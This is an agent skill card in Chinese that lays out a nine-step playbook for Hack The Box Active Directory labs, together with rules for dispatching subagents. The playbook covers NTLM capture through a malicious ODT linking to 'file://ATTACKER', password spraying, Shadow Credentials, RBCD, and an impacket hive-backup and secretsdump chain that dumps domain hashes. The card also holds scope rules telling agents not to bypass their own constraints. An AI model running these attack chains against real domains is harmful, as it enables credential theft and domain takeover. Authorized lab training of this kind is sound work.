---
name: 'htb-workflow'
description: 'HTB Insane AD 靶机全链主线：入口→凭据→ACL→模拟→特权→RBCD→DA→双旗 9 步 + RS 工具链执行层（并行子代理 保上下文/三查/PTY 纪律）+ 子代理分发协议（自包含任务书 / owner 互斥含资源独占 / 邀请反驳 / 先回报后利用）+ frontier 持久化探索层（共享待办 / 资产覆盖矩阵 / 证据角色 / 否证四元组 / retester 复核）。（检索词：htb/workflow/insane/ad/chain/playbook/rs/子代理/subagent/任务书/brief/自包含/owner/互斥/资源独占/端口独占/在跑任务/open run/邀请反驳/refute/否证/negative result/先回报后利用/收尾还原/调度/orchestration/frontier/共享待办/todolist/停摆/standstill/资产覆盖矩阵/anchor/锚点/血缘/证据角色/evidence role/baseline/proof/对照/retester/复测/独立复核/假否证/false negative/traces/过程检索/htb_traces/探针/liveness/先证探针/持久化/persistence）'
whenToUse: '打 Insane AD 靶机开局必读：入口→凭据→ACL→模拟→特权→RBCD→DA→双旗 9 步主线；派发/管理子代理（尤其多网段 Pro Lab）时读「子代理分发协议」一节；需要跨子代理/跨会话保留计划、把结论绑到资产与证据时，读「frontier 与证据锚点」一节（完整模板见 frontier-and-evidence-anchors 卡）。'
metadata: { domain: meta, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
# HTB Workflow v2 — Insane AD 靶机全链主线 + RS 工具链执行层

> 来源：Hercules HTB (Insane) 泛化。启动骨架走 box-startup；本 skill 是"入口 → Domain Admin"的完整主线 playbook。
> **每阶段有产出判定，产出满足才进下一阶段；卡住先输出困境标签再动手。**

## 主线总览（9 步）

```
[1] 入口侦察: 端口/服务指纹 → 找"非标准攻击面"（LDAP注入/自研Web/LFI）
[2] Web 初始访问: 认证绕过 → 文件上传 → 凭据窃取（NTLM 捕获）
[3] 凭据横向: 拿到的密码/hash 立即喷洒所有服务（WinRM/SSH/SMB/Web）
[4] ACL 枚举: BloodHound → 找 OU 委派/GenericWrite/GenericAll 链
[5] 用户模拟: Shadow Credentials / 移动对象触发 ForceChangePassword / 重置密码
[6] 特权账户: 证书服务(ESC3/ESC8) / 解 adminCount 保护 → 服务账户密码重置
[7] 域控路径: RBCD（含 SPN-less U2U）→ 机器账户控制 → 提权服务账户
[8] Domain Admin: Administrator TGS → DCSync → 全量 hash
[9] 收尾: 双 flag（🔴 搜全盘非默认位置）+ 恢复被改密码 + 入 KG
```

---

## 🔴 RS 工具链执行层（每阶段强制，防上下文爆炸）

> **核心：主上下文只保留"决策+结论"，一切批量探测/搜索/研究丢 subagent 或轻量工具。**
> 来源：Hercules 教训 — 全程串行在主上下文跑工具，tool output 灌爆上下文导致压缩 3-4 次。

```
[0] 开局: todo_write 建 9 步清单（映射本 skill）→ 每完成一步用 todo_write 改 status 签收
    （⚠️ `complete_step` 是 RS 时代工具名，本 harness 不存在）
[1] 侦察: nmap 版本扫描后 → 并行子代理/parallel-recon 并行探测（2-8 个 subagent）
    ├─ 每个端口探测 = 1 个 subagent 任务
    ├─ CVE/技术搜索（searchsploit/tavily/GitHub）= 独立 subagent
    └─ 主上下文只收"结论摘要"，细节向该 subagent 追问（send_message）或对后台任务读 job_output
       （⚠️ `read_subagent_result` 是 RS 时代工具名，本 harness 用 subagent 自身返回值）
[2] 卡住（同方向 ≥2 次失败）→ 强制三查（缺一不可）:
    memory search "<错误码/技术词>" + history search "<错误码>" + KG search_nodes
    → 输出困境分类标签（阻断点6 格式）→ 才允许继续
    🔴 DSH 落地写法（2026-09-30 实测；RS 的 read_skill/history search 在本 harness 不存在）:
      · memory = mcp__memory__search_nodes("<错误码/技术词>")
      · KG     = 同上一并把靶机名/软件/CVE 查一遍（先查重再建，不重复建实体）
      · history = **没有给模型的检索工具**（session-archive 是 Web UI 客户端插件，
                  dsh.client.platform: web，不暴露 model tool）⇒ 必须走 shell 配方:
        ```powershell
        $z = "C:\Users\<user>\Miniconda3\Library\bin\zstd.exe"
        # 全工作区扫（会话是 zstd 压缩的，直接 grep 扫不到）
        Get-ChildItem "$env:USERPROFILE\.dsh\sessions\<工作区目录>" -Recurse -Filter 'session.v4.jsonl.zstd' |
          ForEach-Object { & $z -d -c $_.FullName 2>$null } |
          Select-String '<错误码>'
        # 只查最近一个会话（更快）
        $f = Get-ChildItem "$env:USERPROFILE\.dsh\sessions\<工作区目录>" -Recurse -Filter 'session.v4.jsonl.zstd' |
             Sort-Object LastWriteTime -Descending | Select-Object -First 1
        & $z -d -c $f.FullName | Select-String '<错误码>'
        ```
        实测基准（2026-09-30）：34 个会话里 5 个出现过 KDC_ERR_PREAUTH_FAILED ——
        **这条查是有效的，不是形式主义**。跳过它等于把过去踩过的坑再踩一遍。
[3] 读文档/WP/网页 → web_fetch 优先（禁止 curl+python 硬解析 HTML）
[4] 发现类命令输出 → 全量 > out.txt 完整读，禁止 tail/head 截断
[5] 长命令/交互 → PTY；短命令（≤30s）→ pwsh（Windows 本机）/ bash（Linux 目标）
    （⚠️ `execute_command` 是 RS 时代工具名，本 harness 不存在）
```

---

## 🔴 子代理分发协议（rs 执行层的调度面 · Pro Lab 多段场实测）

> **前提：主上下文是唯一稀缺资源 —— 主代理只做调度与裁决，不亲自做重活。**
> 单机场子靠上面的执行层够用；**多网段 / 长周期（Pro Lab）**时真正的瓶颈是"派单质量"：
> 子代理看不到主对话，**你以为的"共享上下文"不存在**。以下按可执行清单写，派单前照抄。

### 1. 任务书必须自包含（最关键）

任务书 = **一整块现状 + 恰好一个任务**。缺任一项，子代理就在猜 —— 而**猜错的前提会被继承并放大**。

| # | 必含要素 | 写法要点 |
|---|---|---|
| ① | 通道现状 | 当前是直连 / SOCKS 端口 / 在哪台机器原生发包；已知断点 |
| ② | 已实测可用的凭据与通道 | 只给**已验证**的；口令写变量名或文件路径，不进正文 |
| ③ | 目标网段白名单 | 🔴 **显式白名单**（只列被授权的那几段），**不写排除法**（排除式迟早漏一个） |
| ④ | 任务（只有一个） | 一句话可执行动作；同一份任务书不要塞第二件事 |
| ⑤ | 完成判据 | 三种出口都写：`命中` / `全否` / `时间盒到` |
| ⑥ | 纪律红线 | 不碰别的 agent 的目标；共享 lab 不动别人的进程与文件 |
| ⑦ | 交付格式 | 见 §6（命中 / 否证两种格式固定） |

### 2. 交接靠文件，不靠对话

把台账路径（`loot/<lab>.md`，路径含变量替换）与相关 `NOTES.md` 写进任务书，并要求子代理
**先读结论再动手**："读台账里标 `已证否 · 别重复` 的段落，不要重做已证否的事"。
⇒ 主代理**不复述上下文**，省两份 token，也避免复述时的信息损失。

### 3. 一个子代理 = 一个有界工作流 + 「可以宣布否证」的契约

任务书要写死"**做不到也算完成**，但必须回报证据"。实测最值钱的产出里**一大半是否证**（排除法地图，
不是失败）—— 与 `prolab-engagement-playbook` §8.6「负结论也必须写进台账」同源。

### 4. 先回报、别深挖（发现与利用分开决策）

任务书写死："**任何命中先回报（目标 + 证据 + 建议下一步），深挖等主代理再派**"。
否则子代理会把整个上下文烧在"利用"上，而"发现"的价值在它烧完之前就已经产生了。

### 5. 🔴 明确邀请它反驳任务书

任务书里必须有一句：**"如果我的前提有错，请直接指出并给证据。"**
实测最好的几个结果都是子代理**证伪了主代理的前提**才出现的：

- 用 `tcpdump -e` 看 RST 的源 MAC，推翻"整段 254 台活主机"（实为网关代答）；
- 指出"只统计 `Connected` 的扫描器分不清『主机活/端口关』与『被丢』"，并因此**撤回**自己上一轮结论；
- 指出某个提权 PoC 在目标内核上不成立（换链才成功）；另一台该 PoC 已打补丁且无编译器。

⇒ **没有这句话，错误前提会被继承并放大**：子代理会努力在你画错的地图上找路。

### 6. 交付格式固定（两种）+ 当场提交

```
命中: flag id + 原文 + 位置（哪个文件 / 哪一行）→ 🔴 当场提交，再回报
否证: 做了什么 + 原始证据（命令 + 关键输出片段）+ 判定（含"对照组长什么样"）
```

### 7. 🔴 互斥纪律要显式，且要维护

- **同名目标 / 同一台机器同时只有一个 owner**；后续任务书逐条写"**不要碰 X（别的 agent 在做）**"。
- 反面教训（实测两次真发生）：同一份"凭据扫描"被派了两遍（白做一遍）；同段两个 agent 并行，
  其中之一把对方的扫描流量误判成"lab 手植的陈旧配置"（后改判为有价值的更正，但成本已经付了）。
- 🔴 **不只任务要划 owner，资源也要划 owner** —— 端口 / 通道 / 文件 / 队列目录都是单例。
  实测（Ifrit）：主/子代理撞了 `/cmdc.bat`（同一个 C2 命令队列）、撞了 kali:445 上的 ntlmrelayx，
  逼出 `mux8000.py` 这种"为了共用端口而临时写的复用器"（虽是好事，但**本可避免**）。
  ⇒ 任务书除"你负责 X"外**必须加一行**：

```
你独占：端口 <P> / 通道 <C> / 文件 <F>；不碰：<别人在用的资源清单>
```

  判据（派单前一条命令能查）：`ss -tlnp` 看端口有没有第二个占用者；`ps` 看同一工具是否已有实例。
- ⇒ **台账里维护一行实时表**，派单前先看它：

```
## 在跑任务表（派单前必读 / 派单后必写）
| owner | 目标（源机 → 目的） | 任务形态 | 预计交付 | 状态 |
|---|---|---|---|---|
| A1 | 枢纽机 → 段 A 存活扫描 | 只读探测 | 主机表 | running |
```

> 🔴 **本表已降级为纸质投影**（2026-10-10）：**并行批次**的权威是 `task_board_list(tag=…, status="running")`；
> **串行链**的权威是 `loot/<machine>-frontier.md` 的依赖链表。本表只作为人肉速记保留，冲突时以上面两者为准。
> 三者的分工与实测依据见 `frontier-and-evidence-anchors` §1。

### 8. 并行边界 · 收尾契约 · 知识型工作也可派

```
🔴 可并行: 端口 / 主机 / 协议互不相关的探测；彼此独立的研究题（见 parallel-recon）
🔴 必须串行: 有依赖的（A 的结果决定 B 怎么做）—— 并行 = 两边都在猜，结论互相污染
🔴 收尾契约: 改过的必须还原【并给出复核输出】—— 逐项验证（端口转发规则 / 防火墙 / 客户端配置 /
   靶机临时文件）；共享 lab 另加"不动别的玩家的进程与文件"
🔴 知识型工作同样可外包: "读台账 → 写进技能库 / 写复盘" —— 给"源"的路径，不给原始上下文
🛑 红线随任务书下发: 越界网段白名单每次都带上 —— 实测有一次子代理误入别人家的实例网段，
   因为任务书带了红线，它才主动上报并纠正；没带红线 = 它连"该不该上报"都无从判断
```

### 9. 主代理真正该做的三件事

```
① 把用户给的线索翻译成任务书 —— 用户的线索常直接决定最终旗的落点：
   "用户名线索" ⇒ 子代理从某机 SUID 属主定出真实账号 + 靠跨段口令复用进入；
   "某主机是被源过滤而非不存在" ⇒ 子代理按指定源做 ping sweep 找到隐藏主机
② 做子代理做不了的裁决：是否允许爆破 / 是否越界 / 是否 reset / 是否战略转向
③ 维护台账与「在跑任务表」，收尾把结论落回 loot/（别只留在对话里）
```

⇒ 台账三轴与依赖链模板见 `engagement-inventory-and-triage`；阶段切换该不该继续打见 `prolab-engagement-playbook`。

### 10. 🔴 编排侧的三个"机制"（2026-10，50 道挑战实战；这三条都是**吃过亏**才写的）

**① 时间盒必须变成机制，否则它只是"声明"。**
实测代价：两条子任务的盒都是 25 分钟，实际分别跑到 **87 / 112 分钟**，其中一个白占并发位（且最终 STUCK）。
- 子代理**不会自己掐表** ⇒ 任务书里必须写**可执行的自检**："**每开始一个新实验前，先算一次 `now − start`**；超盒立刻停止新实验、转入回报流程"。
- 主代理侧也要有机制：**主判据用 `idle`（该题目录最后一次文件写入距今多久），`elapsed` 只作参考**。原因：子代理写 `start=` 的**时区不统一**（有的写 `(Kali local) / (host)` 两个值），而**续做 agent 会追加写同一个 notes.md**，首行 `start=` 属于上一轮 ⇒ 直接相减会得出"738 分钟"这种荒唐值。
- 阈值与话术：`idle > 20 min` 且仍存活 ⇒ 发消息收口——*"时间盒已超时，给你 5 分钟：有带出处的候选就立即提交并回报；否则按『已排除 / 最可靠模型 / 下一步候选 3 条』回报 STUCK。超时不提高成功率，只烧并发位。"*
- ⚠️ **超盒有两种成因，都要问一句**：一种是**真卡住**，另一种是**早已解出、只是没上报**（实测各有一例）⇒ 一律当"卡住"处理会误杀已完成成果。

**② 全局唯一资源必须由调度侧排队，不能靠子代理自觉。**
实测：容器类资源**全局只有 1 个槽位**（起第二个会把第一个挤下线）。我曾让**两条容器任务同时存在**。
- ⇒ **派单前先看在跑清单里有没有占用该资源的任务**；有就不再派同类（不占用该资源的任务可并行）。
- ⇒ 给任务书写明："**先做静态、本地把逻辑验证完，只在"只差打远端"时才申请资源**；用完立刻释放"。

**③ "全都没命中"型否证的复核纪律。**
最贵的一次误判：某否证脚本的 oracle 把**输入源搞错了**（拿内存镜像自身的字节当密文，而真密文在容器文件里），于是产出一个**看起来极严谨**的假否证（有随机率吻合、多组参数、多线程），差点让正确的路被永久排除；换对 oracle 后 25 分钟解出。
- ⇒ **否证性结论必须能被独立复核到"喂了什么输入"那一行**；只有结论没有输入来源的排除，不可信。
- ⇒ 主代理的推论：**当结论是"全都没命中"时，可信度取决于 oracle 的正确性，而不是扫描量** —— 别据此接受 STUCK，值得换正确 oracle 再派一轮（本会话靠这条翻盘了两道）。

**④ 子代理异常终止的处置（本会话 5 次）。**
- **不要重派**：优先 `send_message` **续跑同一个 agent**（上下文与中间成果都还在），并把"它缺的情报"一次性补齐。
- **成果不依赖回报**：靠 ① **notes.md 边做边写**（一个实验一行）② **API 侧独立复核**（`authUserSolveTime` 非空 + solves +1）③ 落库 `loot/chal-<id>/`。实测有一次子代理打完旗就崩、零回报，仍能凭 ②③ 完整取回成果。
- ⇒ **任务书必须写死"边做边写台账"**：本会话三次"攒着写"导致失败即丢推理（最长丢了 14 分钟的关键进展）。

---

## 🔴 frontier 与证据锚点（持久化探索层 · 2026-10-10 新增）

> **为什么加这一节**：`todo_write` 是**会话状态**——子代理看不到、续做 agent 会重建、主上下文压缩后可能丢。
> ARTEX 能在无状态会话里自主走完多步利用链，靠的是把"计划"从**会话状态**提升为**任务级持久状态**。
> DSH 的等价物是**两个既有机制**：**task board**（并行批次的状态与归属）+ **文件**（串行依赖序与证据）——
> 不是新写一层文字，也不引入数据库。
> 本节只给纪律与最小模板；**完整模板 / 跨 agent 检索配方 / retester 任务书**见 `frontier-and-evidence-anchors` 卡。

### A. 状态落点：并行批次 → task board；串行链 → frontier 文件

| 信息 | 落点 | 依据（本机实测） |
|---|---|---|
| 无依赖的并行探测批次 | **task board**（链根 + 一层子卡，`run` 并发） | `run` 的语义就是"子树并发"，匹配；另有 durable 状态 + 执行历史 + 排期 |
| 串行依赖链 | **frontier 文件** | 看板 `maxSubtaskDepth: 1` 建不出多层树；`run` 会把整条链**并发**展开；列由执行结算驱动，**无手动 done** |
| 证据锚点 / 结论台账 | frontier 文件（§C） | 看板不表达"证据角色 / 喂了什么输入" |
| 过程留痕 | `traces/` | 同上 |

```
loot/<machine>.md                    # 作战台账（既有约定，职责不变）= 资产真值库
loot/<machine>-frontier.md           # 串行依赖链 + 覆盖矩阵 + 证据锚点 = 探索图
loot/<machine>/traces/<agent>.md     # 🆕 每个子代理的过程留痕 = 过程库
task board（tag=<machine>）           # 🆕 并行批次的 durable 状态与归属（不在文件里）
```

🔴 **绝不对串行链的链根调 `task_board_run`** —— 它把整棵子树**并发**跑起来，
而攻击链是有前后依赖的串行序列。要执行只 run **单张**卡。

### B. 三条强制纪律 + 停摆底线

```
[ ] 🔴 派单前必读：并行批次看 task_board_list(tag=…, status="running")；串行步骤看 frontier 依赖链
    —— 确认没在跑、前置 fact 已存在、全局独占资源（如唯一容器槽位）不冲突
[ ] 🔴 派单后必写：并行批次建子卡（task_board_create … parentId=<链根>）；
    串行步骤在依赖链表补一行（步骤 ↔ 任务卡 id ↔ owner）
[ ] 🔴 完成即签收：把产出证据的行号填进依赖链表（`traces/A1.md:40-88`）—— **空着等于没做完**
[ ] 🔴 停摆自检：若「目标未达成」且 task_board_list(tag=…, status="running") 为空
    且 依赖链无 running 行 ⇒ 本轮**必须**产生一个具体下一步
    （建卡 / 换 oracle 重派 / 显式宣布放弃并写理由）。**禁止既不派单也不宣布终止。**
```

> **停摆自检是本节最值钱的一条**：静默卡死不报错、不产生否证、不烧 token，只是不再前进——
> 人不在环时只有机械检查能发现它。（本机 Struggle 监视器已在收这类数据，见 `frontier-and-evidence-anchors` §1.4。）

### C. 证据锚点：结论必须绑资产、绑角色、绑到"喂了什么输入"

- **资产覆盖矩阵**：每条结论必须落在某个 `host:port / domain / path` 行上；**未落表的结论视为不存在**。
- **证据角色 role（四值）**：
  | role | 用途 |
  |---|---|
  | `baseline` | **正常对照** —— 🔴 判活 / 判"不存在" / 判"被拦" 时**强制** |
  | `proof` | 直接证明结论的输出 |
  | `verification` | 第二条独立路径 |
  | `supporting` | 默认 |
- ⇒ `baseline` 是把 `htb-methodology` 的**对照组法变成必填字段**（判"段不存在"用「必然不存在的地址 + 广播地址」对照；
  判"无响应"要拿**确实存在**的文件对照——`Store` 的 LFI 误判就是这么来的）。
- **结论台账最后一列判据**：能指着某一行说出"**喂进去的是什么数据**"，才算复核得了。
  只有结论、没有输入来源的排除 ⇒ **一律标记不可信**，交给 D 复核。
- 🔴 **否证先过工具闸**：`htb_coverage record(conclusion="negative", role="baseline", …)` ——
  缺 `baseline` 对照证据 id 会被工具**直接拒绝**。四元组（probe / primitive / 字段类型或协议语义 / control）
  + `retest_cost` 的完整判据见 `frontier-and-evidence-anchors` §2.5。
- 🔴 **"无结果"前先证探针活着**：`ps` 进程在否 · `ss` 端口在听否 · 日志字节数涨否。
  实测：把"中继日志没有 Received connection"读成"coercion 没落到中继上"，真相是**中继进程早已静默退出**。

### D. retester：全否型结论的独立复核（🔴 卡住信号一出现就派，不只收尾）

```
[ ] 触发①（新增，优先）：卡住信号一出现就派 fresh-context retester ——
    同一路径失败 ≥3 次 / 换过 ≥2 个方向仍不通 / 未决队列为空 / idle > 20 min
    🔴 不等预算烧完。实测：第二个子代理 04:37 才起、05:05 出货，只剩 25 分钟余量。
[ ] 触发②：frontier「已收敛」表 + 结论台账里所有 结论 ∈ {全否, 已证否, 已排除, 无响应, 不存在}
[ ] 做法：派**独立子代理**（不要复用产出该否证的 agent —— 它复现不了自己的盲区）
[ ] 任务书写法：把否证写成 "believed <结论>，probed with <原语> —— please re-test with a
    **different primitive**"（🔴 裸结论交下去，子代理只能靠自觉才重测）
[ ] 🔴 显式邀请"一步到位的变体"：若发现能一步替代我给的多步方案的变体，优先用一步的并回报
[ ] 判据：复核到"喂了什么输入"那一行；没输入来源的直接判【不可信】
[ ] 三态回报：仍成立 / 已推翻 / 无法确认
[ ] 处置：判「已推翻」或「不可信」⇒ 立刻从「已收敛」移回「待办链」并（换正确 oracle）重派
```

> 依据 §10③ 的最贵误判：**否证的可信度取决于 oracle 的正确性，不取决于扫描量**。
> 否证成本极低、破坏力极大（把正确的路从搜索空间划掉，而且划得有理有据）——**让产出否证的人复核等于没复核**。
> 否证条目的**四元组 + 重测成本**（写不出即不许进否证表）见 `frontier-and-evidence-anchors` §2.5。

### E. 自设约束的表述纪律（防 agent 绕自己的规矩）

凡是写**我方纪律**（越界白名单 / 共享 lab 互斥 / 红线卡拦截），加固定前缀：

```
⛔ [平台策略，非目标防御] 此约束来自我方纪律，**不是靶标的防护**。不可绕过、不可换编码重试。
   遇此约束请转向其他路径，或回报请求裁决。
```

> 🔴 反面模式：写成"目标不允许这样做" ⇒ 下一个 agent 会去**绕过目标限制**。
> 正解：写成"**我们不允许这样做**" ⇒ agent 转向，而不是攻击自己的纪律。

---

## [1] 入口侦察 — 找"非标准攻击面"

```
产出: 一张端口×服务×版本×攻击面表格 + 每个可疑点标记 [PENDING]
动作:
  - nmap 两步扫描（box-startup 阶段1）→ 阻断点2 逐端口探测（并行 subagent）
  - 🔴 自研 Web 应用（非 Apache/IIS 默认页）→ 优先攻击：
      - 登录框 → 注入测试（LDAP/SQL/NoSQL）→ 响应差异 = 有效反馈
      - 下载/导出功能 → LFI（../../web.config / .env）
      - 文件上传 → 格式解析链（ODT/PDF/图片 → 是否有网络请求?）
  - 每个版本 → searchsploit + GitHub Advisory（不加年份过滤）
  - 🔴 限流信号（429/慢响应）→ 节流脚本（每 8-10 请求停 45s），不硬跑
```

## [2] Web 初始访问 — 认证绕过 + 凭据窃取

```
产出: 一个已认证会话 或 一组有效凭据
动作（按优先级）:
  - 注入拿明文凭据（description/注释字段常藏密码 → 逐字符提取 or 找 WP 线索）
  - 配置文件泄露 → machineKey/JWT secret → 伪造会话 cookie
      （.NET: LegacyAuthCookieCompat v2.0.5 签名格式；userData 角色串必须匹配！）
  - 已认证上传点 → 恶意文档（ODT: <draw:object xlink:href="file://ATTACKER">）
      → Responder 捕获 NTLM → 密码喷洒
  - 🔴 凭据一拿到 → 立即全服务喷洒（Web/WinRM/SSH/SMB/IMAP），不试单个
```

## [3] 凭据横向 — WinRM/SSH 立足点

```
产出: 一个交互 shell
动作:
  - 喷洒成功 → 找可用客户端（🔴 NTLM 全禁域 → 全部 -k Kerberos）
  - WinRM 客户端优先级: winrmexec(pipx 装) > evil-winrm > pywinrm/pypsrp（易卡 SPN）
  - 拿 shell → 🔴 阻断点1 固定序列（本地状态报告）→ 阻断点6 隧道判断
```

## [4] ACL 枚举 — 找提权链

```
产出: BloodHound/手工枚举出的"用户→OU→对象"权限图
动作:
  - SharpHound 全收集 → 重点边: GenericAll/GenericWrite/ForceChangePassword/CreateChild/WriteDACL
  - 🔴 OU 结构即攻击面: 看每个 OU 的委派（谁对 OU 有 CREATE_CHILD/GenericAll）
  - adminCount=1 的对象 = DACL_PROTECTED → OU 继承失效 → 需先解保护（见[6]）
  - 记下"敏感组"成员（Backup/Smartcard/Service Operators 等）→ 它们对特定 OU 有隐藏权限
```

## [5] 用户模拟 — Shadow Credentials / 对象移动

```
产出: 一个可用的低权用户凭据（TGT/hash）
动作:
  - GenericWrite 用户 → certipy shadow auto（🔴 不加 -dc-host，只用 -target）
  - CreateChild on OU → 把目标用户移到该 OU → 获得 ForceChangePassword → 重置密码
      （⚠️ 移动后原 OU 权限可能变化；密码不能含用户名子串）
  - 拿到的用户 → 立即 kinit + 测 WinRM（Remote Management Users 组）
```

## [6] 特权账户 — ESC3 + adminCount 解保护

```
产出: 一个特权服务账户（可改目标机器账户密码）
动作:
  - 禁用+密码过期账户 → 先启用(UAC 512) + 设密码（certipy account update）
      ⚠️ 机器有"自动重置机制"（~5分钟）→ 循环脚本：改完立即用
  - 证书: EnrollmentAgent 模板 → 申请 on-behalf-of 证书（🔴 certipy 5.1 必须 -dcom，RPC 有 bug）
  - adminCount=1 保护 → 找 Scheduled Task "cleanup"（SYSTEM 任务清 adminCount）
      → 先给任务主体组加 OU GenericAll → 触发任务 → 立即改 UAC+密码
```

## [7] 域控路径 — RBCD（含 SPN-less）

```
产出: 目标机器账户（如 IIS_WEBSERVER$）控制权
动作:
  - 特权账户对 OU 有 ForceChangePassword → 重置机器账户密码
  - 查 DC 的 msDS-AllowedToActOnBehalfOfOtherIdentity → 含哪个 SID → 那是关键机器账户
  - 机器账户有 SPN → 标准 RBCD（bloodyAD add rbcd / getST -u2u）
  - 机器账户无 SPN → 🔴 /rbcd-spnless（SPN-less U2U: changepasswd -newhashes 改 NT hash = TGT session key）
```

## [8] Domain Admin — TGS → DCSync

```
动作:
  - Administrator@cifs/dc TGS → secretsdump -k（DCSync）→ 全量 hash
  - psexec -k 可用但 stdout 不回显（读 flag 用 smbclient -k）
  - smbclient -k: use C$ → cd 目标目录 → get 文件（🔴 get 不能带本地路径参数；-outputfile 只写 banner）
```

🔴 **另一条常见终点：Backup Operators / SeBackupPrivilege（全程不需要域管）**
```
impacket-reg -k -no-pass dom/u@dc backup -o 'C:\Windows\SYSVOL\sysvol'   # ★ 落点选 SYSVOL
  → printf 'use SYSVOL\nget SAM.save\nget SYSTEM.save\nget SECURITY.save\n' | impacket-smbclient -k -no-pass dc
  → impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local   # $MACHINE.ACC
  → impacket-secretsdump 'DC01$@DC' -hashes :<机器账户NT> -just-dc-ntlm
★ 三条要点：① 落点必须【DC 本地】路径，写 UNC 会 rpc_s_access_denied
            ② 必须带 SECURITY hive（$MACHINE.ACC 在里面，只有 SAM 拿不到）
            ③ 报 0xb7 = 上一次其实成功了，直接去取   → 完整版见 ad-checklist §8.12
```

## [9] 收尾 — flag + 恢复 + 入库

```
🔴 flag 全盘搜（默认路径经常没有）: C:\Users\Admin\Desktop 等非默认位置
🔴 改过的密码/hash 全部恢复原值（临时 session key 尤其）
收尾强制三步: KG 实体+关系 / 规则审计计数 / 变更复盘 → box-startup 阶段5
```

---

## 🔴 贯穿全程的铁律（v2 新增 RS 纪律）

```
[1] 工具报协议错误（BADOPTION/ETYPE_NOSUPP/STATUS_NOT_SUPPORTED）
    → 先按名加载对应技能卡 + 搜索（HackTricks/NetExec Wiki），禁止改源码试错（阻断点7）
[2] 无 preauth 账户 ≠ 能拿 session key: getTGT -no-pass 会失败（AS-REP enc-part 用 client key 加密）
[3] AES key 派生: impacket string_to_key 含 derive('kerberos')，裸 PBKDF2 是错的
[4] NTLM 全禁域 → 一切 Kerberos（-k）；changepasswd target 必须主机名（cifs SPN）
[5] 机器重置机制 = 变化信号 → 循环脚本 + 窗口内完成
[6] 🔴 并行子代理 保上下文: 批量探测/搜索丢 subagent，主上下文只留结论（Hercules 压缩 3-4 次的根因）
[7] 🔴 卡住三查必含 history: memory + history + KG（PingPong 经验躺在 history 里没被查）
    ⚠️ DSH 没有 history 检索工具，必须走 zstd 解压配方 —— 完整命令见本卡 §RS 工具链执行层 [2]
[8] 🔴 开局 todo_write 建清单，每步用 todo_write 改 status 签收
    （⚠️ `complete_step` 是 RS 时代的工具名，本 harness 不存在）
[9] 🔴 子代理看不到主对话 ⇒ 任务书必须自包含 + 显式邀请它反驳前提 + 先回报后利用
    （派单前后查/写「在跑任务表」；完整清单见本卡 §子代理分发协议）
[10] 🔴 观测边做边落 traces（用 `htb_traces` 的 append/search，不是手写）：**开工/接手/换方向前先 search 关键词**。
    "够不上一条 fact"的观察（报错、0 命中、可疑参数）正是它要收的东西 —— 实测 1 次检索可省 2.5 小时。
[11] 🔴 资源（端口/通道/文件/队列）随任务一起划 owner；派单前 `ss -tlnp` + `ps` 各查一次有没有第二占用者
```

## 🔗 关联

- 启动: `box-startup` | 侦察: `service-attacks` / `web-attacks` | AD: `ad-checklist`
- 提权: `linux-privesc` / `windows-privesc` | 横向: `lateral-movement`
- RBCD 无 SPN: `rbcd-spnless` | 卡住: `/debug-5whys`
- 调度: `parallel-recon`（侦察并行边界） | `prolab-engagement-playbook`（阶段路由 / 模式 9 调度层） | `engagement-inventory-and-triage`（台账与在跑任务表）
- 案例: hercules-progress | 检查表: htb-master-checklist | 架构: htb-agent-v6-architecture
